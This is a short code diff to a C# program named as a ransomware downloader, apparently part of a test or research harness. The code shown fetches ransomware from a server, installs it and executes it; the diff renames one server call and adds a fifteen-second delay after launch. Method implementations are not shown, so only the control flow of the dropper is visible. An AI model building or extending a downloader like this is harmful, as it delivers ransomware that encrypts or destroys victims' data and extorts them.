@@ -29,7 +29,7 @@ namespace BaseLineRansomwareDownloader
             serverCommunicator.setRansomwareFilePath();
 
             //Recieves the ransomware from the server
-            serverCommunicator.getBaseRansomware();
+            serverCommunicator.getBaseHost();
             Console.WriteLine(serverCommunicator.getNAMEONTEST());
             Thread.Sleep(100);
             //Install ransomware
@@ -44,6 +44,8 @@ namespace BaseLineRansomwareDownloader
             //Starts the ransomware
             programExecuter.executeProgram(serverCommunicator.getRansomwareFilePath());
 
+
+            Thread.Sleep(15000);
 
             //Play ransomware
         }
